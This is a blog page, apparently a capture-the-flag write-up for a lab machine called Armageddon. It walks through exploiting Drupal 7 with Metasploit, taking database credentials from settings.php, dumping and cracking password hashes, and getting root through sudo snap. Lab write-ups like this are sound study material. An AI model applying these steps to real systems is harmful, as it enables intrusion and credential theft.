<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Armageddon | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="1.nmap scan  2.webfrom the burpsuite,we can get the response and know it build with drupal 7when we use searchsploit,we can see some exploitwe can use msfconsole to exploit it 1234search drupal 7use 1">
<meta property="og:type" content="article">
<meta property="og:title" content="Armageddon">
<meta property="og:url" content="http://example.com/2022/07/16/Armageddon/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="1.nmap scan  2.webfrom the burpsuite,we can get the response and know it build with drupal 7when we use searchsploit,we can see some exploitwe can use msfconsole to exploit it 1234search drupal 7use 1">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/07/16/Armageddon/nmap.png">
<meta property="og:image" content="http://example.com/2022/07/16/Armageddon/burp.png">
<meta property="og:image" content="http://example.com/2022/07/16/Armageddon/searchsploit.png">
<meta property="og:image" content="http://example.com/2022/07/16/Armageddon/msf.png">
<meta property="og:image" content="http://example.com/2022/07/16/Armageddon/database.png">
<meta property="og:image" content="http://example.com/2022/07/16/Armageddon/passwd.png">
<meta property="og:image" content="http://example.com/2022/07/16/Armageddon/hash.png">
<meta property="og:image" content="http://example.com/2022/07/16/Armageddon/hashcrack.png">
<meta property="og:image" content="http://example.com/2022/07/16/Armageddon/ssh.png">
<meta property="og:image" content="http://example.com/2022/07/16/Armageddon/sudo.png">
<meta property="og:image" content="http://example.com/2022/07/16/Armageddon/prepare.png">
<meta property="og:image" content="http://example.com/2022/07/16/Armageddon/upload.png">
<meta property="og:image" content="http://example.com/2022/07/16/Armageddon/download.png">
<meta property="og:image" content="http://example.com/2022/07/16/Armageddon/root.png">
<meta property="article:published_time" content="2022-07-16T14:58:49.000Z">
<meta property="article:modified_time" content="2022-07-16T16:26:29.418Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/07/16/Armageddon/nmap.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 6.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-Armageddon" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/16/Armageddon/" class="article-date">
  <time class="dt-published" datetime="2022-07-16T14:58:49.000Z" itemprop="datePublished">2022-07-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      Armageddon
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/16/Armageddon/nmap.png">

<h4 id="2-web"><a href="#2-web" class="headerlink" title="2.web"></a>2.web</h4><p>from the burpsuite,we can get the response and know it build with drupal 7<br><img src="/2022/07/16/Armageddon/burp.png"><br>when we use searchsploit,we can see some exploit<br><img src="/2022/07/16/Armageddon/searchsploit.png"><br>we can use msfconsole to exploit it</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search drupal 7</span><br><span class="line">use 1</span><br><span class="line">set rhosts 10.10.10.233</span><br><span class="line">set lhost 10.10.14.15</span><br></pre></td></tr></table></figure>
<p>and we can get the shell<br><img src="/2022/07/16/Armageddon/msf.png"><br>it denied us to cd &#x2F;home<br>so we cd to sites&#x2F;default and in the settings.php,we can get the database’s username and password<br><img src="/2022/07/16/Armageddon/database.png"><br>username:<code>drupaluser</code><br>password:<code>CQHEy@9M*m23gBVj</code></p>
<p>we can try this to login mysql<br>but in the &#x2F;etc&#x2F;passwd,we didn’t see drupaluser,therefore we probably need to get password hashes from the database itself:<br><img src="/2022/07/16/Armageddon/passwd.png"><br>Using the credentials drupaluser:<code>CQHEy@9M*m23gBVj</code>, we can get the databases users and hashes.   </p>
<pre><code>mysql -u drupaluser -p&quot;CQHEy@9M*m23gBVj&quot; -e &quot;use drupal; select name,pass from users;&quot;
</code></pre>
<img src="/2022/07/16/Armageddon/hash.png">
Using the RockYou wordlist we can crack the password hash for the brucetherealadmin user.

<pre><code>john -w=/usr/share/wordlists/rockyou.txt hash.txt
</code></pre>
<img src="/2022/07/16/Armageddon/hashcrack.png">

<p>username:brucetherealadmin<br>password:booboo<br>And we have brucetherealadmin’s password! Now let’s try to login via SSH:<br><img src="/2022/07/16/Armageddon/ssh.png"></p>
<h4 id="3-getting-root-access"><a href="#3-getting-root-access" class="headerlink" title="3.getting root access"></a>3.getting root access</h4><p>when we use <code>sudo -l</code>,Looks like we are able to run snap as the root user without any password, therefore let’s use the <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/snap/">gtfobin</a> for snap:<br><img src="/2022/07/16/Armageddon/sudo.png"><br>first we get fpm and do something next</p>
<pre><code>gem install fpm
</code></pre>
<img src="/2022/07/16/Armageddon/prepare.png">
Now we upload the malicious privesc snap file to the machine and run it:
<img src="/2022/07/16/Armageddon/upload.png">
<img src="/2022/07/16/Armageddon/download.png">
Now let's run snap as the root user to make use of the snap package we created:
<img src="/2022/07/16/Armageddon/root.png">


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/07/16/Armageddon/" data-id="cm4ma4vzh0002efcpactdhhwb" data-title="Armageddon" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/16/Previse/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          Previse
        
      </div>
    </a>
  
  
    <a href="/2022/07/15/Forlic/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Forlic</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/12/11/Love/">Love</a>
          </li>
        
          <li>
            <a href="/2022/09/10/solidstate/">solidstate</a>
          </li>
        
          <li>
            <a href="/2022/09/07/nineveh/">nineveh</a>
          </li>
        
          <li>
            <a href="/2022/09/06/haircut/">haircut</a>
          </li>
        
          <li>
            <a href="/2022/09/06/cronos/">cronos</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>